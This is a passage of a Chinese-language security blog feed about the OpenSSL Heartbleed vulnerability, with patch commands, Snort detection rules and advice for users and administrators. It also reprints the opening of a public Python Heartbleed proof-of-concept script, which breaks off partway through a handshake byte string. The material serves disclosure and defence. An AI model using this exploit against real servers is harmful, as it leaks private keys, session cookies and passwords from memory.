    &lt;li&gt;stackoverflow.com&lt;/li&gt;
    &lt;li&gt;stackexchange .com&lt;/li&gt;
    &lt;li&gt;php.net&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;感謝 StackNG 的補充：Cloudflare 於 2014 年 4 月 7 日 11 時公告，但在漏洞公告之前已經修復。&lt;/p&gt;

&lt;h3 id=&quot;目前還有哪些伺服器有問題呢&quot;&gt;目前還有哪些伺服器有問題呢？&lt;/h3&gt;

&lt;p&gt;根據 &lt;a href=&quot;https://zmap.io/&quot;&gt;ZMap&lt;/a&gt; 的&lt;a href=&quot;https://zmap.io/heartbleed/&quot;&gt;研究報告&lt;/a&gt;指出，他們針對 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 前一百萬個網站&lt;/a&gt;進行檢測，大約有 36% 的伺服器支援 TLS、7.6% 的伺服器含有此漏洞。ZMap 並提供了一個&lt;a href=&quot;https://zmap.io/heartbleed/vulnerable.html&quot;&gt;完整的清單&lt;/a&gt;列出在 2014/4/11 17:00 尚未修復漏洞的網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;有什麼值得測試的網站呢&quot;&gt;有什麼值得測試的網站呢？&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;via &lt;a href=&quot;https://www.facebook.com/photo.php?fbid=10201756684385494&quot;&gt;Facebook&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;我要怎麼更新-openssl-呢&quot;&gt;我要怎麼更新 OpenSSL 呢？&lt;/h3&gt;

&lt;p&gt;根據不同的 Linux Distribution 有不同的更新方式，若有自己客製化一些程式設定，可能就需要自行更新。以下我們簡單介紹更新步驟：&lt;/p&gt;

&lt;p&gt;RedHat / CentOS / Fedora 系列更新套件：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yum update
yum update openssl #只更新 OpenSSL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Debian / Ubuntu 系列更新套件：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get update
sudo apt-get dist-upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;若只要更新 OpenSSL 則可以執行以下指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install --only-upgrade openssl
sudo apt-get install --only-upgrade libssl1.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;注意 OpenSSL 是否已經更新為修復的版本：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpm -q -a | grep &quot;openssl&quot;  # RedHat
dpkg -l | grep &quot;openssl&quot;    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接著請記得撤銷原本的簽章金鑰，重新簽署，並記得提交 CSR (Certificate Signing Request) 給 CA (Certification Authority)。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -new -newkey rsa:2048 -nodes -keyout hostname.key -out hostname.csr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;結束後記得重新啟動相關服務&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service httpd restart      # RedHat
sudo service apache2 restart    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最後再使用檢測工具看自己的網頁伺服器或其他相關服務是否已經不在漏洞受害範圍。&lt;/p&gt;

&lt;h3 id=&quot;我無法更新我的伺服器我該怎麼在-ids-偵測攻擊呢&quot;&gt;我無法更新我的伺服器，我該怎麼在 IDS 偵測攻擊呢？&lt;/h3&gt;

&lt;p&gt;若你使用 Snort IDS，官方已經釋出 SID 30510 到 30517 來偵測，並且在 Community Rules 中也有包含。&lt;br /&gt;
&lt;a href=&quot;http://www.snort.org/snort-rules/#community&quot;&gt;http://www.snort.org/snort-rules/#community&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; SIDs &lt;span class=&quot;m&quot;&gt;30510&lt;/span&gt; through &lt;span class=&quot;m&quot;&gt;30517&lt;/span&gt; address detection of the heartbleed attack 

&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL SSLv3 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 00|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;  &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30510; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 01|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30511; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1.1 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 02|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30512; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1.2 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 03|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30513; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER SSLv3 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 00|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30514; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 01|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30515; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1.1 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 02|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30516; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $HOME_NET 443 -&amp;gt; $EXTERNAL_NET any (msg:&amp;quot;SERVER-OTHER TLSv1.2 large &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat response - possible ssl heartbleed attempt&amp;quot;; flow:to_client,established; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;content:&amp;quot;|18 03 03|&amp;quot;; depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;by_dst, count 5, seconds 60; metadata:policy balanced-ips drop, policy security-ips &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;drop, service ssl; reference:cve,2014-0160; classtype:attempted-recon; sid:30517; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;rev:3;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;民眾與管理者應對措施&quot;&gt;民眾與管理者應對措施&lt;/h3&gt;

&lt;p&gt;不少朋友來信、留言洽詢，到底自己該怎麼針對這次的漏洞應變？我們簡單就一般民眾以及系統管理者說明。&lt;/p&gt;

&lt;h3 id=&quot;一般民眾應對措施&quot;&gt;一般民眾應對措施&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;注意常用的重要網站服務，是否有針對 Heartbleed 漏洞的更新措施。不少大公司都有發出公告、公告信等。&lt;/li&gt;
  &lt;li&gt;若常用網站服務有遭遇此風險，記得更換帳號密碼。&lt;/li&gt;
  &lt;li&gt;若這段時間有網站通知更換密碼，也請注意是否為釣魚信件。&lt;/li&gt;
  &lt;li&gt;注意自己的帳號是否有異常活動。&lt;/li&gt;
  &lt;li&gt;若使用的網站服務就是不更新，&lt;strong&gt;一天一信友善提醒管理者&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;系統管理者應對措施&quot;&gt;系統管理者應對措施&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2，並密切注意有無後續更新。&lt;/li&gt;
  &lt;li&gt;重新產生金鑰（Private Key 可能外洩）、Session（Session ID 可能外洩）、密碼（密碼也可能外洩），並且撤銷原本的金鑰。&lt;/li&gt;
  &lt;li&gt;若無法更新，重新編譯 OpenSSL 以關閉 heartbeat 功能。&lt;/li&gt;
  &lt;li&gt;使用 &lt;a href=&quot;http://en.wikipedia.org/wiki/Forward_secrecy&quot;&gt;Perfect Forward Secrecy (PFS)&lt;/a&gt;，在未來類似風險發生時減低傷害。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;許多業者抱持著僥倖的心態，想說外洩的目標不會輪到自己。如果大家看到這幾天&lt;strong&gt;全世界資安人員 / 駭客不眠不休的撈取資料&lt;/strong&gt;，應該會徹底消滅僥倖的想法乖乖做好防護。在漏洞揭露的頭幾天，就已經陸續看到不少駭客進入 Google、Facebook、Yahoo! 等伺服器，並且撰寫大規模掃描工具大量攻擊。除非你有把握自己的伺服器沒有任何連線，不然還是請乖乖更新吧。&lt;/p&gt;

&lt;h3 id=&quot;大事件大啟示&quot;&gt;大事件，大啟示&lt;/h3&gt;

&lt;p&gt;還記得之前我們提到的「&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;使用第三方套件所要擔負的資安風險&lt;/a&gt;」？這次的事件就是一個血淋淋的案例。不管是廠商、社群、個人開發者的粗心失誤，或者是國家機器 NSA 的強力滲透，使用各種第三方的套件都需要承擔極大的風險。但可悲的是，我們卻無法不使用。從這次的事件我們可以學到幾件事情：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;不管哪種攻擊手法、多老舊的攻擊手法，在未來都可能會再度發生。&lt;/li&gt;
  &lt;li&gt;程式碼的 review 非常重要，一定要在開發過程中導入程式碼 review 機制，以免開發者寫出含有安全疑慮的程式碼。&lt;/li&gt;
  &lt;li&gt;加密、Session 控管、金鑰控管等議題，是永遠的課題。一天沒處理好，在未來的風險中會再度受害。&lt;/li&gt;
  &lt;li&gt;風險永遠會發生在你猜不到的地方，可能是程式、可能是函式庫、&lt;a href=&quot;http://technews.tw/2013/09/06/most-common-encryption-protocols-are-useless-against-nsa-surveillance/&quot;&gt;可能是加密協定&lt;/a&gt;、更可能是&lt;a href=&quot;http://ckhung0.blogspot.tw/2014/03/dual-ec-drbg.html&quot;&gt;亂數產生器&lt;/a&gt;。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;不斷的增強資安意識、不停的分享新知、廠商做好資安控管及&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;安全檢測&lt;/a&gt;、民眾對企業和政府要求資訊安全，集合大家的力量，是改善資安大環境的不二法門。&lt;/p&gt;

&lt;p&gt;你以為自己逃過一劫了嗎？也許你的身體已經血流如柱，而嗜血的鯊魚正游向你。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/</link>
                <guid>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect</guid>
                <pubDate>Fri, 11 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 </title>
                <description>&lt;h3 id=&quot;openssl-cve-2014-0160-嚴重漏洞&quot;&gt;OpenSSL CVE-2014-0160 嚴重漏洞&lt;/h3&gt;

&lt;p&gt;OpenSSL 今天公告了一個極度嚴重的漏洞（&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;），被稱為「&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;」，而他確實也如同心臟噴出血般嚴重。這個漏洞能讓攻擊者從伺服器記憶體中讀取 64 KB 的資料，利用傳送 heartbeat 的封包給伺服器，在封包中控制變數導致 memcpy 函數複製錯誤的記憶體資料，因而擷取記憶體中可能存在的機敏資料。記憶體中最嚴重可能包含 ssl private key、session cookie、使用者密碼等，因此可能因為這樣的漏洞導致伺服器遭到入侵或取得使用者帳號。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;詳細的分析可以參閱 &lt;a href=&quot;http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html&quot;&gt;existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;軟體名稱：OpenSSL&lt;/li&gt;
  &lt;li&gt;影響範圍：1.0.1 至 1.0.1f / 1.0.2-beta ~ 1.0.2-beta1&lt;/li&gt;
  &lt;li&gt;修復版本：1.0.1g / 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;影響系統版本
    &lt;ul&gt;
      &lt;li&gt;Debian Wheezy (stable), OpenSSL 1.0.1e-2+deb7u4&lt;/li&gt;
      &lt;li&gt;Ubuntu 12.04.4 LTS, OpenSSL 1.0.1-4ubuntu5.11&lt;/li&gt;
      &lt;li&gt;CentOS 6.5, OpenSSL 1.0.1e-15&lt;/li&gt;
      &lt;li&gt;Fedora 18, OpenSSL 1.0.1e-4&lt;/li&gt;
      &lt;li&gt;OpenBSD 5.3 (OpenSSL 1.0.1c 10 May 2012) and 5.4 (OpenSSL 1.0.1c 10 May 2012)&lt;/li&gt;
      &lt;li&gt;FreeBSD 10.0 - OpenSSL 1.0.1e 11 Feb 2013&lt;/li&gt;
      &lt;li&gt;NetBSD 5.0.2 (OpenSSL 1.0.1e)&lt;/li&gt;
      &lt;li&gt;OpenSUSE 12.2 (OpenSSL 1.0.1c)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;影響服務：HTTP、SMTPS、IMAPS、POP3S 等使用 OpenSSL 之服務&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OpenSSL 的公告如下：&lt;a href=&quot;https://www.openssl.org/news/secadv_20140407.txt&quot;&gt;https://www.openssl.org/news/secadv_20140407.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;
A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.
&lt;/pre&gt;

&lt;h3 id=&quot;如何自我檢測&quot;&gt;如何自我檢測？&lt;/h3&gt;

&lt;p&gt;要如何測試自己的網站有沒有這樣的漏洞呢？可以利用以下的網站或工具直接查詢。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed test &lt;a href=&quot;http://filippo.io/Heartbleed/&quot;&gt;http://filippo.io/Heartbleed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;直接輸入 Domain 即可查詢，例如「fbi.gov」。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;自我測試工具 &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt; （或 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;http://pastebin.com/WmxzjkXJ&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用方法直接執行「python ssltest.py ifttt.com」，或是用「-p」指定特定 SSL 連接埠。畫面上會顯示出記憶體資料，可能內含機敏資料例如 private key、session cookie 等。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;原始碼如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The author disclaims copyright to this source code.&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;select&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;optparse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;%prog server [options]&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-p&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;--port&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;int&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;TCP port to test (default: 443)&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h2bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;16 03 02 00  dc 01 00 00 d8 03 02 53&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04&lt;/span&gt;
